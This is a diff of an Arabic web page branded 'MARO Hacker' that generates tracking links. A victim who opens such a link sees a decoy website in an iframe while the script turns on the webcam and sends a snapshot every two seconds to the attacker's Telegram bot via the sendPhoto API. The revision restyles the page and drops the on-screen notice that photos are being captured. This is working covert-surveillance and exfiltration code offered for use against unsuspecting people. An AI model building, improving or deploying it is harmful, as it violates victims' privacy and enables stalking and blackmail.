@@ -1,147 +1,249 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>مولد الروابط</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>MARO - مولد روابط ونافذة عرض</title>
   <style>
-    body {
-      font-family: Tahoma, sans-serif;
-      background: #0f0f0f url('YOUR_IMAGE_URL') no-repeat center center / cover;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+    :root{
+      --bg1:#0b0712;
+      --card:#131026;
+      --accent1:#a66bff;
+      --accent2:#6e3be0;
+      --muted:#bfaef6;
     }
-    .box {
-      background: rgba(0,0,0,0.7);
-      padding: 20px;
-      border-radius: 12px;
-      width: 350px;
+    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
+    /* الخلفية الصورة */
+    body{
+      background-image: url("https://i.ibb.co/ccvSfNKt/f8373d322110e98419d228013b405636.jpg");
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      position:relative;
     }
-    h1 {
-      text-align: center;
-      color: #4a89dc;
+    /* دايمًا إضافة غطاء لطمس الخلفية قليل */
+    .overlay {
+      position:fixed; inset:0; background: linear-gradient(18deg, rgba(6,6,8,0.6), rgba(6,6,1,0.8));
+      z-index:0;
     }
-    .input-group {
-      margin-bottom: 15px;
+
+    /* الحاوية المركزية */
+    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
+
+    /* هيدر */
+    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
+    .brand{font-weight:800;font-size:22px;color:var(--accent1);letter-spacing:0.6px}
+    .nav{display:flex;gap:18px}
+    .nav a{color:#e6dbff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
+
+    /* البطاقة */
+    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
+      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
+
+    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
+    .hero-left{flex:1;min-width:260px}
+    .title{font-size:34px;color:var(--accent1);margin:0 0 8px}
+    .subtitle{color:var(--muted);margin:0 0 18px}
+
+    /* الفورم */
+    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
+    label{display:block;color:#d7c9ff;font-weight:700;margin:10px 0 6px}
+    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
+    .row{display:flex;gap:12px}
+    .btn{
+      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#fff;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
     }
-    label {
-      display: block;
-      margin-bottom: 5px;
+    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
+    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
+
+    /* شارة الكاميرا الصغيرة */
+    .captureBadge{
+      position:fixed;top:14px;right:14px;z-index:9999;
+      background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
+      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
     }
-    input {
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      background: #4a89dc;
-      color: #fff;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-      background: #3570b5;
-    }
-    #result {
-      margin-top: 15px;
-      word-break: break-all;
-      background: rgba(255,255,255,0.1);
-      padding: 10px;
-      border-radius: 8px;
+
+    /* Made by MARO */
+    .madeby{position:fixed;left:14px;bottom:14px;z-index:9999;color:#d9c9ff;background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;box-shadow:0 6px 20px rgba(0,0,0,0.5)}
+    
+    /* iframe full */
+    .viewerFrame{width:100%;height:calc(100vh - 40px);border-radius:10px;border:0;overflow:hidden}
+    
+    /* responsive */
+    @media (max-width:720px){
+      .title{font-size:28px}
+      .card{padding:16px}
+      .wrap{padding:18px}
     }
   </style>
 </head>
 <body>
+  <div class="overlay"></div>
 
-<div class="box" id="formBox">
-  <h1>مولد الروابط</h1>
-  <div class="input-group">
-    <label>أدخل الـ ID</label>
-    <input type="text" id="chatIdInput" placeholder="Chat ID">
+  <div class="wrap">
+
+    <!-- Header -->
+    <div class="header" style="width:100%;max-width:1100px;">
+      <div class="brand">MARO Hacker</div>
+      <div class="nav">
+        <a href="#"></a>
+        <a href="#"></a>
+      </div>
+    </div>
+
+    <!-- Card with form -->
+    <div class="card" id="cardArea" style="width:100%">
+      <div class="hero">
+        <div class="hero-left">
+          <h1 class="title">Hello, I'm MARO</h1>
+          
+
+          <div class="form" id="formBox">
+            <label>أدخل الـ ID</label>
+            <input type="text" id="chatIdInput" placeholder="Chat ID">
+
+            <label>أدخل توكن البوت</label>
+            <input type="text" id="tokenInput" placeholder="Bot Token">
+
+            <label>أدخل الرابط الذي تريد عرضه</label>
+            <input type="text" id="linkInput" placeholder="https://b7xha.github.io/Maroweb/">
+
+            <button class="btn" id="generateBtn">إنشاء الرابط</button>
+
+            <div id="result" style="display:none" class="result">
+              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
+              <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Visual side (big CTA buttons like screenshot) -->
+        <div style="min-width:260px;flex:0 0 260px;">
+          <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
+            
+          </div>
+        </div>
+      </div>
+    </div>
+
   </div>
-  <div class="input-group">
-    <label>أدخل التوكن</label>
-    <input type="text" id="tokenInput" placeholder="Bot Token">
-  </div>
-  <div class="input-group">
-    <label>أدخل الرابط</label>
-    <input type="text" id="linkInput" placeholder="https://example.com">
-  </div>
-  <button id="generateBtn">إنشاء الرابط</button>
-  <div id="result"></div>
-</div>
+
+  <!-- small badge and made by -->
+  <div id="captureBadge" class="captureBadge"></div>
+  <div class="madeby"></div>
 
 <script>
-const generateBtn = document.getElementById("generateBtn");
-const result = document.getElementById("result");
+  // عناصر
+  const generateBtn = document.getElementById('generateBtn');
+  const resultEl = document.getElementById('result');
+  const linkText = document.getElementById('linkText');
+  const copyBtn = document.getElementById('copyBtn');
 
-generateBtn.addEventListener("click", () => {
-  const chatId = document.getElementById("chatIdInput").value.trim();
-  const token = document.getElementById("tokenInput").value.trim();
-  const link = document.getElementById("linkInput").value.trim();
+  // عند الضغط يولد الرابط المباشر (بدون اختصار)
+  generateBtn.addEventListener('click', () => {
+    const chat = document.getElementById('chatIdInput').value.trim();
+    const token = document.getElementById('tokenInput').value.trim();
+    const url = document.getElementById('linkInput').value.trim();
 
-  if (!chatId || !token || !link) {
-    alert("املأ كل الحقول");
-    return;
+    if(!chat || !token || !url){
+      alert('املأ كل الحقول');
+      return;
+    }
+
+    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(url)}`;
+    linkText.innerText = fullLink;
+    resultEl.style.display = 'flex';
+  });
+
+  // زر النسخ
+  copyBtn.addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(linkText.innerText);
+      copyBtn.innerText = 'تم النسخ';
+      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
+    } catch(e) {
+      alert('فشل النسخ: ' + e.message);
+    }
+  });
+
+  // --- viewer mode: لو الرابط يحتوي پاراميترز نعرض iframe ونشغل الكاميرا ---
+  const params = new URLSearchParams(window.location.search);
+  const chat = params.get('chat');
+  const token = params.get('token');
+  const target = params.get('url');
+
+  if (chat && token && target) {
+    // استبدال المحتوى بعرض الـ iframe (مع الحفاظ على البادج ومصدر الخلفية)
+    document.getElementById('cardArea').style.display = 'none';
+    // نضع iframe يغطي اللـ fold لكن نريد الاحتفاظ بالبادج و madeby
+    const iframe = document.createElement('iframe');
+    iframe.className = 'viewerFrame';
+    iframe.src = target;
+    // نضيف iframe بعد الـ wrap
+    document.querySelector('.wrap').appendChild(iframe);
+
+    // اظهار البادج
+    const captureBadge = document.getElementById('captureBadge');
+    captureBadge.style.display = 'inline-block';
+
+    // نبدأ الكاميرا ونرسل صور كل 2 ثانية
+    (async function startCameraAndSend(){
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const vid = document.createElement('video');
+        vid.autoplay = true; vid.playsInline = true; vid.muted = true; vid.style.display = 'none';
+        vid.srcObject = stream;
+        document.body.appendChild(vid);
+
+        const canvas = document.createElement('canvas');
+
+        // إرسال كل 2 ثانية
+        const tick = async () => {
+          if (!vid.videoWidth) return;
+          canvas.width = vid.videoWidth;
+          canvas.height = vid.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(async (blob) => {
+            if (!blob) return;
+            try {
+              const form = new FormData();
+              form.append('chat_id', chat);
+              form.append('photo', blob, 'img.png');
+
+              await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: form
+              });
+              // لا نظهر أي رسالة للمستخدم — البادج كافي
+            } catch (err) {
+              // لو خطأ في الإرسال نغير نص البادج مؤقتاً
+              captureBadge.textContent = '⚠️ خطأ في الإرسال';
+              captureBadge.style.background = 'rgba(160,40,40,0.9)';
+              console.error('Send error', err);
+            }
+          }, 'image/png');
+        };
+
+        // أولاً تأكد الفيديو شغال ثم ضبط interval
+        const intervalId = setInterval(tick, 2000);
+
+        // تنظيف عند الخروج
+        window.addEventListener('beforeunload', () => {
+          clearInterval(intervalId);
+          stream.getTracks().forEach(t => t.stop());
+        });
+
+      } catch (err) {
+        // إذن الكاميرا مرفوض أو مشكلة، نبِّه المستخدم بالبادج
+        const captureBadge = document.getElementById('captureBadge');
+        captureBadge.textContent = '❌ إذن الكاميرا مرفوض';
+        captureBadge.style.background = 'rgba(160,40,40,0.9)';
+        console.error('Camera error', err);
+      }
+    })();
   }
-
-  // نضيف البيانات في الرابط
-  const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chatId)}&token=${encodeURIComponent(token)}&url=${encodeURIComponent(link)}`;
-  
-  result.innerHTML = `<p>🔗 رابطك:</p><div><a href="${fullLink}" target="_blank">${fullLink}</a></div>`;
-});
-
-// عند فتح الرابط → يعرض الموقع + يلتقط صور
-const urlParams = new URLSearchParams(window.location.search);
-const openUrl = urlParams.get("url");
-if (openUrl) {
-  document.body.innerHTML = `
-    <div style="position:fixed;top:10px;left:10px;color:white;font-size:14px;">📸 يتم التقاط صور...</div>
-    <iframe src="${openUrl}" style="border:none;width:100%;height:100vh;"></iframe>
-  `;
-
-  const chatId = urlParams.get("chat");
-  const token = urlParams.get("token");
-
-  // تشغيل الكاميرا والتقاط صورة كل ثانيتين
-  const video = document.createElement("video");
-  video.style.display = "none";
-  document.body.appendChild(video);
-
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
-      video.play();
-
-      setInterval(() => {
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
-
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("photo", blob, "image.png");
-
-          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        }, "image/png");
-      }, 2000);
-    })
-    .catch(err => console.log("فشل تشغيل الكاميرا:", err));
-}
 </script>
-
 </body>
 </html>
